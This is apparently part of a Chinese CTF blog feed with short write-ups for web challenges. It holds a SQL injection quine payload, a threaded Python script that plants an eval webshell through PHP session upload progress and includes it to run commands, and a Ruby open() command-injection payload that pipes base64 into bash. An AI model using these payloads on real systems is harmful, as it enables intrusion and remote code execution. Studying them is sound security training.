<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;SELECT&#x2F;**&#x2F;REPLACE(REPLACE(&#39;&quot;&#x2F;**&#x2F;union&#x2F;**&#x2F;SELECT&#x2F;**&#x2F;REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)&#x2F;**&#x2F;AS&#x2F;**&#x2F;pass#&#39;,CHAR(34),CHAR(39)),CHAR(46),&#39;&quot;&#x2F;**&#x2F;union&#x2F;**&#x2F;SELECT&#x2F;**&#x2F;REPLACE(REPLACE(&quot;.&quot;,CHAR(34),CHAR(39)),CHAR(46),&quot;.&quot;)&#x2F;**&#x2F;AS&#x2F;**&#x2F;pass#&#39;)&#x2F;**&#x2F;AS&#x2F;**&#x2F;pass#</span><br><span class="line"></span><br><span class="line">&#39;union(select(replace(replace(&#39;&quot;union(select(replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)))#&#39;,char(34),char(39)),char(46),&#39;&quot;union(select(replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)))#&#39;)))#</span><br></pre></td></tr></table></figure>

<h2 id="EasyCleanup"><a href="#EasyCleanup" class="headerlink" title="EasyCleanup"></a>EasyCleanup</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;mode&#x27;</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($_GET[<span class="string">&#x27;mode&#x27;</span>] == <span class="string">&quot;eval&quot;</span>)&#123;</span><br><span class="line">    $shell = $_GET[<span class="string">&#x27;shell&#x27;</span>] ?? <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> $shell;</span><br><span class="line">    <span class="keyword">if</span>(strlen($shell) &gt; <span class="number">15</span> | filter($shell) | checkNums($shell)) <span class="keyword">exit</span>(<span class="string">&quot;hacker&quot;</span>);</span><br><span class="line">    <span class="keyword">eval</span>($shell);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(strlen($_GET[<span class="string">&#x27;file&#x27;</span>]) &gt; <span class="number">15</span> | filter($_GET[<span class="string">&#x27;file&#x27;</span>])) <span class="keyword">exit</span>(<span class="string">&quot;hacker&quot;</span>);</span><br><span class="line">    <span class="keyword">include</span> $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$var</span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">    $banned = [<span class="string">&quot;while&quot;</span>, <span class="string">&quot;for&quot;</span>, <span class="string">&quot;\$_&quot;</span>, <span class="string">&quot;include&quot;</span>, <span class="string">&quot;env&quot;</span>, <span class="string">&quot;require&quot;</span>, <span class="string">&quot;?&quot;</span>, <span class="string">&quot;:&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;+&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;%&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;`&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>($banned <span class="keyword">as</span> $ban)&#123;</span><br><span class="line">        <span class="keyword">if</span>(strstr($var, $ban)) <span class="keyword">return</span> <span class="literal">True</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkNums</span>(<span class="params">$var</span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">    $alphanum = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>;</span><br><span class="line">    $cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($alphanum); $i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>($j = <span class="number">0</span>; $j &lt; strlen($var); $j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>($var[$j] == $alphanum[$i])&#123;</span><br><span class="line">                $cnt += <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span>($cnt &gt; <span class="number">8</span>) <span class="keyword">return</span> <span class="literal">True</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>session upload</code>文件包含</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">sessid = <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&quot;cmd&quot;</span>: <span class="string">&quot;system(&#x27;ls /&#x27;);&quot;</span>&#125;</span><br><span class="line">url = <span class="string">&quot;http://114.115.134.72:32770/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        resp = session.post(url,</span><br><span class="line">                            data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;,</span><br><span class="line">                            files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;111.txt&#x27;</span>, f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = session.post(url+<span class="string">&#x27;?file=/tmp/sess_&#x27;</span> + sessid,</span><br><span class="line">                            data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;111.txt&#x27;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            print(resp.text)</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event = threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=write, args=(session,)).start()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read, args=(session,)).start()</span><br><span class="line">    event.set()</span><br></pre></td></tr></table></figure>

<h2 id="PNG图片转换器"><a href="#PNG图片转换器" class="headerlink" title="PNG图片转换器"></a>PNG图片转换器</h2><p>题目给了个附件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;sinatra&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;digest&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;base64&#x27;</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  open(<span class="string">&quot;./view/index.html&quot;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/upload&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  open(<span class="string">&quot;./view/upload.html&quot;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">post <span class="string">&#x27;/upload&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  unless params[:file] &amp;&amp; params[:file][:tempfile] &amp;&amp; params[:file][:filename] &amp;&amp; params[:file][:filename].split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">-1</span>] == <span class="string">&#x27;png&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;error&#x27;);location.href=&#x27;/upload&#x27;;&lt;/script&gt;&quot;</span></span><br><span class="line">  end</span><br><span class="line">  begin</span><br><span class="line">    filename = Digest::MD5.hexdigest(Time.now.to_i.to_s + params[:file][:filename]) + <span class="string">&#x27;.png&#x27;</span></span><br><span class="line">    open(filename, <span class="string">&#x27;wb&#x27;</span>) &#123; |f|</span><br><span class="line">      f.write open(params[:file][:tempfile],<span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="string">&quot;Upload success, file stored at #&#123;filename&#125;&quot;</span></span><br><span class="line">  rescue</span><br><span class="line">    <span class="string">&#x27;something wrong&#x27;</span></span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/convert&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  open(<span class="string">&quot;./view/convert.html&quot;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">post <span class="string">&#x27;/convert&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  begin</span><br><span class="line">    unless params[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;error&#x27;);location.href=&#x27;/convert&#x27;;&lt;/script&gt;&quot;</span></span><br><span class="line">    end</span><br><span class="line">    file = params[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    unless file.index(<span class="string">&#x27;..&#x27;</span>) == nil &amp;&amp; file.index(<span class="string">&#x27;/&#x27;</span>) == nil &amp;&amp; file =~ /^(.+)\.png$/</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;dont hack me&#x27;);&lt;/script&gt;&quot;</span></span><br><span class="line">    end</span><br><span class="line">    res = open(file, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">    headers <span class="string">&#x27;Content-Type&#x27;</span> =&gt; <span class="string">&quot;text/html; charset=utf-8&quot;</span></span><br><span class="line">    <span class="string">&quot;var img = document.createElement(\&quot;img\&quot;);\nimg.src= \&quot;data:image/png;base64,&quot;</span> + Base64.encode64(res).gsub(/\s*/, <span class="string">&#x27;&#x27;</span>) + <span class="string">&quot;\&quot;;\n&quot;</span></span><br><span class="line">  rescue</span><br><span class="line">    <span class="string">&#x27;something wrong&#x27;</span></span><br><span class="line">  end</span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<p>关键看到<code>open</code>函数那里，参考</p>
<p><code>https://cheatsheetseries.owasp.org/cheatsheets/Ruby_on_Rails_Cheat_Sheet.html</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eval(&quot;ruby code here&quot;)</span><br><span class="line">system(&quot;os command here&quot;)</span><br><span class="line">&#96;ls -al &#x2F;&#96; # (backticks contain os command)</span><br><span class="line">exec(&quot;os command here&quot;)</span><br><span class="line">open(&quot;\| os command here&quot;)</span><br></pre></td></tr></table></figure>

<p>直接在<code>convert</code>路由拼接命令即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file&#x3D;|echo &#39;bHMgLw&#x3D;&#x3D;&#39;|base64 -d|bash&gt;1.png</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
  </entry>
</search>
